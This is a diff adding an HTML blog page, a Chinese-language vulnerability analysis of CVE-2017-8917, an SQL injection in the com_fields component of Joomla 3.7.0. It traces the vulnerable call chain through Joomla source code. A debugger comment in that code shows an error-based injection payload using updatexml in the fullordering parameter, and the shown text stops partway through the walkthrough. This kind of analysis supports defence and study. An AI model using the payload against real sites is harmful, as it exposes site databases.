@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Joomla," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="漏洞版本： Joomla! 3.7.0测试版本： Joomla! 3.7.0CVE: CVE-2017-8917  漏洞描述  Joomla3.7.0新引入插件”com_fields”，这个组件可任意访问，由于对数据过滤不严导致SQL注入。  漏洞分析\joomla370\components\com_fields\controller.php文件中类FieldsController1234567">
+<meta name="keywords" content="Joomla">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Joomla3.7.0 SQL注入">
+<meta property="og:url" content="https://firedebug.github.io/PHP/Joomla3.7.0SQL注入/index.html">
+<meta property="og:site_name" content="Time Filling...">
+<meta property="og:description" content="漏洞版本： Joomla! 3.7.0测试版本： Joomla! 3.7.0CVE: CVE-2017-8917  漏洞描述  Joomla3.7.0新引入插件”com_fields”，这个组件可任意访问，由于对数据过滤不严导致SQL注入。  漏洞分析\joomla370\components\com_fields\controller.php文件中类FieldsController1234567">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://firedebug.github.io/PHP/Joomla3.7.0SQL注入/20170524173413.jpg">
+<meta property="og:image" content="https://firedebug.github.io/PHP/Joomla3.7.0SQL注入/20170524180553.jpg">
+<meta property="og:image" content="https://firedebug.github.io/PHP/Joomla3.7.0SQL注入/20170524180057.jpg">
+<meta property="og:updated_time" content="2017-05-25T08:35:43.089Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Joomla3.7.0 SQL注入">
+<meta name="twitter:description" content="漏洞版本： Joomla! 3.7.0测试版本： Joomla! 3.7.0CVE: CVE-2017-8917  漏洞描述  Joomla3.7.0新引入插件”com_fields”，这个组件可任意访问，由于对数据过滤不严导致SQL注入。  漏洞分析\joomla370\components\com_fields\controller.php文件中类FieldsController1234567">
+<meta name="twitter:image" content="https://firedebug.github.io/PHP/Joomla3.7.0SQL注入/20170524173413.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://firedebug.github.io/PHP/Joomla3.7.0SQL注入/"/>
+
+
+
+
+
+  <title>Joomla3.7.0 SQL注入 | Time Filling...</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Time Filling...</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">网站副标题</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://firedebug.github.io/PHP/Joomla3.7.0SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="木蚂蚁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Time Filling...">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Joomla3.7.0 SQL注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-24T14:27:21+08:00">
+                2017-05-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index">
+                    <span itemprop="name">php</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>漏洞版本：</strong> Joomla! 3.7.0<br><strong>测试版本：</strong> Joomla! 3.7.0<br><strong>CVE:</strong> CVE-2017-8917 </p>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>  Joomla3.7.0新引入插件”com_fields”，这个组件可任意访问，由于对数据过滤不严导致SQL注入。 </p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>\joomla370\components\com_fields\controller.php文件中类FieldsController<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'view'</span>) === <span class="string">'fields'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'layout'</span>) === <span class="string">'modal'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// Load the backend language file.</span></span><br><span class="line">		$lang = JFactory::getLanguage();</span><br><span class="line"></span><br><span class="line">		$lang-&gt;load(<span class="string">'com_fields'</span>, JPATH_ADMINISTRATOR);	<span class="comment">//joomla370\administrator</span></span><br><span class="line"></span><br><span class="line">		$config[<span class="string">'base_path'</span>] = JPATH_COMPONENT_ADMINISTRATOR;	<span class="comment">//D:\phpStudy\WWW\joomla370\administrator/components/com_fields</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">parent</span>::__construct($config);	<span class="comment">//D:\phpStudy\WWW\joomla370\libraries\legacy\controller\legacy.php</span></span><br></pre></td></tr></table></figure></p>
+<p>调用父类parent::<strong>construct(),跟踪文件joomla370\libraries\legacy\controller\legacy.php中父类JControllerLegacy，依次调用getInstance、</strong>construct，定义一些路径信息。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($rMethods <span class="keyword">as</span> $rMethod)</span><br><span class="line">&#123;</span><br><span class="line">	$mName = $rMethod-&gt;getName();	<span class="comment">//string(11) "__construct"</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Add default display method if not explicitly declared.</span></span><br><span class="line">	<span class="keyword">if</span> (!in_array($mName, $xMethods) || $mName == <span class="string">'display'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;methods[] = strtolower($mName);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Auto register the methods as tasks.</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;taskMap[strtolower($mName)] = $mName;	<span class="comment">//array(1) &#123; ["display"]=&gt; string(7) "display" &#125;</span></span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	....</span><br><span class="line"><span class="comment">// Set the default model search path</span></span><br><span class="line">	<span class="keyword">if</span> (array_key_exists(<span class="string">'model_path'</span>, $config))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// User-defined dirs</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;addModelPath($config[<span class="string">'model_path'</span>], <span class="keyword">$this</span>-&gt;model_prefix);	</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;addModelPath(<span class="keyword">$this</span>-&gt;basePath . <span class="string">'/models'</span>, <span class="keyword">$this</span>-&gt;model_prefix);	<span class="comment">//D:\phpStudy\WWW\joomla370\administrator/components/com_fields/models</span></span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>调用display方法，创建model<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($cachable = false, $urlparams = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$document = JFactory::getDocument();</span><br><span class="line">		$viewType = $document-&gt;getType();	<span class="comment">//string(4) "html"</span></span><br><span class="line">		$viewName = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'view'</span>, <span class="keyword">$this</span>-&gt;default_view);<span class="comment">//$this-&gt;default_view = fields,string(6) "fields"</span></span><br><span class="line">		$viewLayout = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'layout'</span>, <span class="string">'default'</span>, <span class="string">'string'</span>);	<span class="comment">//string(5) "modal"</span></span><br><span class="line">		$view = <span class="keyword">$this</span>-&gt;getView($viewName, $viewType, <span class="string">''</span>, <span class="keyword">array</span>(<span class="string">'base_path'</span> =&gt; <span class="keyword">$this</span>-&gt;basePath, <span class="string">'layout'</span> =&gt; $viewLayout));</span><br><span class="line">		<span class="comment">// Get/Create the model</span></span><br><span class="line">		<span class="keyword">if</span> ($model = <span class="keyword">$this</span>-&gt;getModel($viewName))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// Push the model into the view (as default)</span></span><br><span class="line">			$view-&gt;setModel($model, <span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	.....</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$view-&gt;display();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>getview取得视图，getmodel-&gt;setmodel实例化,最后$view-&gt;display,调用\joomla370\administrator\components\com_fields\views\fields\view.html.php中类FieldsViewFields的display方法。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> function display($tpl = <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$<span class="keyword">this</span>-&gt;state         = $<span class="keyword">this</span>-&gt;<span class="keyword">get</span>(<span class="string">'State'</span>);	<span class="comment">//object(JObject)	D:\phpStudy\WWW\joomla370\libraries\legacy\view\legacy.php</span></span><br><span class="line">	$<span class="keyword">this</span>-&gt;items         = $<span class="keyword">this</span>-&gt;<span class="keyword">get</span>(<span class="string">'Items'</span>);</span><br><span class="line">	$<span class="keyword">this</span>-&gt;pagination    = $<span class="keyword">this</span>-&gt;<span class="keyword">get</span>(<span class="string">'Pagination'</span>);</span><br><span class="line">	$<span class="keyword">this</span>-&gt;filterForm    = $<span class="keyword">this</span>-&gt;<span class="keyword">get</span>(<span class="string">'FilterForm'</span>);</span><br><span class="line">	$<span class="keyword">this</span>-&gt;activeFilters = $<span class="keyword">this</span>-&gt;<span class="keyword">get</span>(<span class="string">'ActiveFilters'</span>);</span><br><span class="line">	.....</span><br></pre></td></tr></table></figure></p>
+<p>调用joomla370\libraries\legacy\view\legacy.php中JViewLegacyget方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($property, $default = null)</span>	//<span class="title">string</span><span class="params">(<span class="number">5</span>)</span> "<span class="title">State</span>"</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// If $model is null we use the default model</span></span><br><span class="line">		<span class="keyword">if</span> (is_null($default))</span><br><span class="line">		&#123;</span><br><span class="line">			$model = <span class="keyword">$this</span>-&gt;_defaultModel;	<span class="comment">//string(6) "fields"</span></span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			$model = strtolower($default);	<span class="comment">//string(6) "fields"</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// First check to make sure the model requested exists</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_models[$model]))	<span class="comment">//object(FieldsModelFields)</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// Model exists, let's build the method name</span></span><br><span class="line">			$method = <span class="string">'get'</span> . ucfirst($property);	<span class="comment">//string(8) "getState"</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">// Does the method exist?</span></span><br><span class="line">			<span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>-&gt;_models[$model], $method))</span><br><span class="line">			&#123;</span><br><span class="line">				</span><br><span class="line">				<span class="comment">// The method exists, let's call it and return what we get</span></span><br><span class="line">				$result = <span class="keyword">$this</span>-&gt;_models[$model]-&gt;$method();	<span class="comment">//调用getState D:\phpStudy\WWW\joomla370\libraries\legacy\model\legacy.php</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">return</span> $result;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
+<p>$result=$this-&gt;_model[$model]-&gt;$method()，调用\joomla370\libraries\legacy\model\legacy.php中类JModelLegacy的getState方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getState</span><span class="params">($property = null, $default = null)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;__state_set)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// Protected method to auto-populate the model state.</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;populateState();		<span class="comment">//D:\phpStudy\WWW\joomla370\administrator\components\com_fields\models\fields.php</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">// Set the model state set flag to true.</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;__state_set = <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $property === <span class="keyword">null</span> ? <span class="keyword">$this</span>-&gt;state : <span class="keyword">$this</span>-&gt;state-&gt;get($property, $default);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>调用\joomla370\administrator\components\com_fields\models\fields.php中类FieldsModelFields的populateState方法，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">populateState</span><span class="params">($ordering = null, $direction = null)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// List state information.</span></span><br><span class="line">		<span class="keyword">parent</span>::populateState(<span class="string">'a.ordering'</span>, <span class="string">'asc'</span>);	<span class="comment">//D:\phpStudy\WWW\joomla370\libraries\legacy\model\list.php</span></span><br><span class="line"></span><br><span class="line">		$context = <span class="keyword">$this</span>-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.context'</span>, <span class="string">'context'</span>, <span class="string">'com_content.article'</span>, <span class="string">'CMD'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;setState(<span class="string">'filter.context'</span>, $context);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Split context into component and optional section</span></span><br><span class="line">		$parts = FieldsHelper::extract($context);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($parts)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;setState(<span class="string">'filter.component'</span>, $parts[<span class="number">0</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;setState(<span class="string">'filter.section'</span>, $parts[<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>又调用父类parent::populateState，跟踪文件\joomla370\libraries\legacy\model\list.php中JModelList类的populateState方法，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">populateState</span><span class="params">($ordering = null, $direction = null)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="comment">// If the context is set, assume that stateful lists are used.</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;context)	<span class="comment">//string(17) "com_fields.fields"</span></span><br><span class="line">	&#123;</span><br><span class="line">		$app         = JFactory::getApplication();	<span class="comment">//object(JApplicationSite)</span></span><br><span class="line">		$inputFilter = JFilterInput::getInstance();	<span class="comment">//object(JFilterInput)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// Receive &amp; set filters</span></span><br><span class="line">		<span class="keyword">if</span> ($filters = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.filter'</span>, <span class="string">'filter'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>)) </span><br><span class="line">	<span class="comment">//com_fields.fields.filter	string(19) "com_content.article"</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $name =&gt; $value)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// Exclude if blacklisted</span></span><br><span class="line">				<span class="keyword">if</span> (!in_array($name, <span class="keyword">$this</span>-&gt;filterBlacklist))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">$this</span>-&gt;setState(<span class="string">'filter.'</span> . $name, $value);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$limit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Receive &amp; set list options</span></span><br><span class="line">		<span class="keyword">if</span> ($list = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.list'</span>, <span class="string">'list'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>))	</span><br><span class="line">	<span class="comment">//array(1) &#123; ["fullordering"]=&gt; string(38) "updatexml(1,concat(0x3e,database()),0)" &#125;</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">foreach</span> ($list <span class="keyword">as</span> $name =&gt; $value)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// Exclude if blacklisted</span></span><br><span class="line">		<span class="keyword">if</span> (!in_array($name, <span class="keyword">$this</span>-&gt;listBlacklist))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// Extra validations</span></span><br><span class="line">			<span class="keyword">switch</span> ($name)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">'fullordering'</span>:</span><br><span class="line">					$orderingParts = explode(<span class="string">' '</span>, $value);</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (count($orderingParts) &gt;= <span class="number">2</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="comment">// Latest part will be considered the direction</span></span><br><span class="line">						$fullDirection = end($orderingParts);</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (in_array(strtoupper($fullDirection), <span class="keyword">array</span>(<span class="string">'ASC'</span>, <span class="string">'DESC'</span>, <span class="string">''</span>)))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">$this</span>-&gt;setState(<span class="string">'list.direction'</span>, $fullDirection);</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">unset</span>($orderingParts[count($orderingParts) - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">						<span class="comment">// The rest will be the ordering</span></span><br><span class="line">						$fullOrdering = implode(<span class="string">' '</span>, $orderingParts);</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (in_array($fullOrdering, <span class="keyword">$this</span>-&gt;filter_fields))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">$this</span>-&gt;setState(<span class="string">'list.ordering'</span>, $fullOrdering);</span><br><span class="line">						&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		......</span><br></pre></td></tr></table></figure></p>
